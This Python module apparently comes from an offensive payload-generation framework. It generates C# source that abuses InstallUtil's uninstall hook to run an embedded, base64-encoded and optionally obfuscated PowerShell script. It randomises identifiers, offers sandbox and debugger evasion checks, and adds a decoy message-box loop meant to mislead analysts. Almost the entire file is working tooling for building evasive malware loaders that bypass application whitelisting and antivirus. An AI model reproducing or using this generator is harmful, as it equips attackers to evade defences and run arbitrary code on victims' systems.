"""

InstallUtil C# unmanaged powershell embedded script execution.
Uses basic variable renaming obfuscation.
Optional: Obfuscate powershell embedded script with Invoke-Obfuscation


Module built by @ConsciousHacker

"""

import base64
from Tools.Bypass.bypass_common import bypass_helpers
from Tools.Bypass.bypass_common import gamemaker
from Tools.Bypass.bypass_common import invoke_obfuscation

class PayloadModule:

    def __init__(self, cli_obj):
        # required
        self.language = "installutil_powershell"
        self.extension = "cs"
        self.rating = "Excellent"
        self.description = "IntallUtil C# unmanaged powershell embedded script execution"
        self.name = "InstallUtil C# Unmanaged powershell embedded script execution"
        self.path = "installutil/powershell/script"
        self.cli_opts = cli_obj
        self.payload_source_code = ''
        if cli_obj.msfvenom is not None:
            self.payload_type = cli_obj.msfvenom
        elif not cli_obj.tool:
            self.payload_type = ''
        self.cli_shellcode = False

        # options we require user ineraction for- format is {OPTION : [Value, Description]]}
        self.required_options = {
                                    "COMPILE_TO_DLL" : ["N", "Compile to a DLL"],
                                    "COMPILE_TO_EXE" : ["Y", "Compile to an executable"],
                                    "EXPIRE_PAYLOAD" : ["X", "Optional: Payloads expire after \"Y\" days"],
                                    "HOSTNAME"       : ["X", "Optional: Required system hostname"],
                                    "DOMAIN"         : ["X", "Optional: Required internal domain"],
                                    "PROCESSORS"     : ["X", "Optional: Minimum number of processors"],
                                    "TIMEZONE"       : ["X", "Optional: Check to validate not in UTC"],
                                    "USERNAME"       : ["X", "Optional: The required user account"],
                                    "DEBUGGER"       : ["X", "Optional: Check if debugger is attached"],
                                    "SLEEP"          : ["X", "Optional: Sleep \"Y\" seconds, check if accelerated"],
                                    "SCRIPT"         : ["/root/script.ps1", "Path of the powershell script"],
                                    "FUNCTION"       : ["X", "Optional: Function to execute within the powershell script"],
                                    "OBFUSCATION"    : ["X", "Optional: Use python Invoke-Obfuscation on the powershell script (binary or ascii)"]
                                }

    def generate(self):

        with open(self.required_options["SCRIPT"][0], "r") as f:
            the_script = f.read()

        if self.required_options["FUNCTION"][0].lower() != "x":
            # Append FUNCTION to end of script
            the_script += "\n{0}".format(self.required_options["FUNCTION"][0])
            FunctionName = self.required_options["FUNCTION"][0]
        else:
            FunctionName = "\"None\""

        if self.required_options["OBFUSCATION"][0].lower() != "x":
            if self.required_options["OBFUSCATION"][0].lower() == "binary":
                the_script = invoke_obfuscation.binaryEncode(the_script)
            elif self.required_options["OBFUSCATION"][0].lower() == "ascii":
                the_script = invoke_obfuscation.asciiEncode(the_script)
            else:
                the_script = invoke_obfuscation.binaryEncode(the_script)

        # randomize all our variable names, yo'
        className = bypass_helpers.randomString()
        classNameTwo = bypass_helpers.randomString()
        classNameThree = bypass_helpers.randomString()
        execName = bypass_helpers.randomString()
        bytearrayName = bypass_helpers.randomString()
        funcAddrName = bypass_helpers.randomString()
        savedStateName = bypass_helpers.randomString()
        messWithAnalystName = bypass_helpers.randomString()
        shellcodeName = bypass_helpers.randomString()
        rand_bool = bypass_helpers.randomString()
        random_out = bypass_helpers.randomString()


        hThreadName = bypass_helpers.randomString()
        threadIdName = bypass_helpers.randomString()
        pinfoName = bypass_helpers.randomString()
        num_tabs_required = 0

        # get random variables for the API imports
        r = [bypass_helpers.randomString() for x in range(16)]
        y = [bypass_helpers.randomString() for x in range(17)]

        #required syntax at the beginning of any/all payloads
        payload_code = "using System; using System.Net; using System.Linq; using System.Net.Sockets; using System.Runtime.InteropServices; using System.Threading; using System.Configuration.Install; using System.Windows.Forms;using System.Reflection; using System.Collections.ObjectModel; using System.Management.Automation; using System.Management.Automation.Runspaces; using System.Text;\n"
        payload_code += "\tpublic class {0} {{\n".format(className)
        payload_code += "\t\tpublic static void Main()\n\t\t{\n"
        # lets add a message box to throw offf sandbox heuristics and analysts :)
        # there is no decryption routine, troll.level = 9000
        # TODO: add a fake decryption function that does nothing and accepts messWithAnalystName as a parameter.
        payload_code += "\t\t\twhile(true)\n{{ MessageBox.Show(\"doge\"); Console.ReadLine();}}\n"
        payload_code += "\t\t}\n\t}\n\n"
        payload_code += "\t[System.ComponentModel.RunInstaller(true)]\n"
        payload_code += "\tpublic class {0} : System.Configuration.Install.Installer\n\t{{\n".format(classNameTwo)
        payload_code += "\t\tpublic override void Uninstall(System.Collections.IDictionary {0})\n\t\t{{\n".format(savedStateName)
        payload_code += "\t\t\t{0}.{1}();\n\t\t}}\n\t}}\n".format(classNameThree, execName)
        payload_code += "\n\tpublic class {0}\n\t{{".format(classNameThree)
        payload_code += "\n\t\tpublic static void {0}() {{\n".format(execName)
        payload_code2, num_tabs_required = gamemaker.senecas_games(self)
        payload_code = payload_code + payload_code2

        encodedScript = bypass_helpers.randomString()
        encodedScriptContents = base64.b64encode(bytes(the_script, 'latin-1')).decode('ascii')
        powershellCmd = bypass_helpers.randomString()
        data = bypass_helpers.randomString()
        command = bypass_helpers.randomString()
        RunPSCommand = bypass_helpers.randomString()
        cmd = bypass_helpers.randomString()
        runspace = bypass_helpers.randomString()
        scriptInvoker = bypass_helpers.randomString()
        pipeline = bypass_helpers.randomString()
        results = bypass_helpers.randomString()
        stringBuilder = bypass_helpers.randomString()
        obj = bypass_helpers.randomString()
        RunPSFile = bypass_helpers.randomString()
        script = bypass_helpers.randomString()
        ps = bypass_helpers.randomString()
        e = bypass_helpers.randomString()

        payload_code += """string {0} = "{1}";
                    string {2} = "";

                    byte[] {3} = Convert.FromBase64String({0});
                    string {4} = Encoding.ASCII.GetString({3});
                    {2} = {4};

                    try
                    {{
                        Console.Write({5}({2}));
                    }}
                    catch (Exception {6})
                    {{
                        Console.Write({6}.Message);
                    }}""".format(encodedScript, encodedScriptContents, powershellCmd, data, command, RunPSCommand, e)

        while (num_tabs_required != 0):
            payload_code += '\t' * num_tabs_required + '}'
            num_tabs_required -= 1

        payload_code +="""}}

                public static string {0}(string {1})
                {{

                    Runspace {2} = RunspaceFactory.CreateRunspace();
                    {2}.Open();
                    RunspaceInvoke {3} = new RunspaceInvoke({2});
                    Pipeline {4} = {2}.CreatePipeline();


                    {4}.Commands.AddScript({1});


                    {4}.Commands.Add("Out-String");
                    Collection<PSObject> {5} = {4}.Invoke();
                    {2}.Close();


                    StringBuilder {6} = new StringBuilder();
                    foreach (PSObject {7} in {5})
                    {{
                        {6}.Append({7});
                    }}
                    return {6}.ToString().Trim();
                 }}

                 public static void {8}(string {9})
                {{
                    PowerShell {10} = PowerShell.Create();
                    {10}.AddScript({9}).Invoke();
                }}""".format(RunPSCommand, cmd, runspace, scriptInvoker, pipeline, results, stringBuilder, obj, RunPSFile, script, ps)

        payload_code += "\n}"
        self.payload_source_code = payload_code
        return
